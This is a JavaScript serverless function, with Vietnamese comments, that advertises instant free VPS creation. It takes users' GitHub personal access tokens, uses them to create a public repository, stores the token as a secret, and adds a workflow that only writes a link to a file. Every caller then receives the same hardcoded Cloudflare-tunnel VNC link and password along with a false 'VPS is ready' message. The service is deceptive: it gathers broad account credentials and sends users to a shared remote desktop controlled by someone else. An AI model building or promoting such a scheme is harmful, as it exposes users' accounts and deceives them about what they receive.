// api/index.js – Vercel Serverless – Trả link ngay lập tức
import { Octokit } from '@octokit/rest';
import sodium from 'libsodium-wrappers';

const FIXED_LINK = 'https://geographic-provides-collaboration-contrast.trycloudflare.com/vnc.html';
const PASSWORD = 'nature';

export default async function handler(req, res) {
  // CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(200).end();

  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Chỉ hỗ trợ POST' });
  }

  const { github_token } = req.body || {};
  if (!github_token || (!github_token.startsWith('ghp_') && !github_token.startsWith('github_pat_'))) {
    return res.status(400).json({ error: 'Token GitHub không hợp lệ!' });
  }

  try {
    const octokit = new Octokit({ auth: github_token });
    const { data: user } = await octokit.rest.users.getAuthenticated();

    const repoName = `vps-nature-${Date.now()}`;
    await octokit.rest.repos.createForAuthenticatedUser({
      name: repoName,
      private: false,
      auto_init: true,
      description: 'VPS Auto – nature'
    });

    // Tạo secret GH_TOKEN
    await sodium.ready;
    const { data: keyData } = await octokit.rest.actions.getRepoPublicKey({
      owner: user.login,
      repo: repoName
    });
    const encrypted = sodium.crypto_box_seal(
      Buffer.from(github_token),
      Buffer.from(keyData.key, 'base64')
    );
    await octokit.rest.actions.createOrUpdateRepoSecret({
      owner: user.login,
      repo: repoName,
      secret_name: 'GH_TOKEN',
      encrypted_value: Buffer.from(encrypted).toString('base64'),
      key_id: keyData.key_id
    });

    // Workflow siêu nhẹ – chỉ tạo file remote-link.txt
    const workflow = `name: VPS Nature Ready
on: workflow_dispatch
jobs:
  ready:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          token: \${{ secrets.GH_TOKEN }}
      - run: |
          echo "${FIXED_LINK}" > remote-link.txt
          git config user.email "bot@vps.com"
          git config user.name "VPS Bot"
          git add remote-link.txt
          git commit -m "VPS ready – nature" --allow-empty
          git push origin main --force`;

    await octokit.rest.repos.createOrUpdateFileContents({
      owner: user.login,
      repo: repoName,
      path: '.github/workflows/vps.yml',
      message: 'Add VPS workflow',
      content: Buffer.from(workflow).toString('base64')
    });

    await octokit.rest.repos.createDispatchEvent({
      owner: user.login,
      repo: repoName,
      event_type: 'workflow_dispatch'
    });

    // TRẢ LINK NGAY LẬP TỨC
    res.status(200).json({
      success: true,
      link: FIXED_LINK,
      password: PASSWORD,
      repo: `https://github.com/${user.login}/${repoName}`,
      message: 'VPS đã sẵn sàng!'
    });

  } catch (error) {
    console.error('Lỗi:', error.message);
    res.status(500).json({ error: error.message || 'Lỗi server' });
  }
}
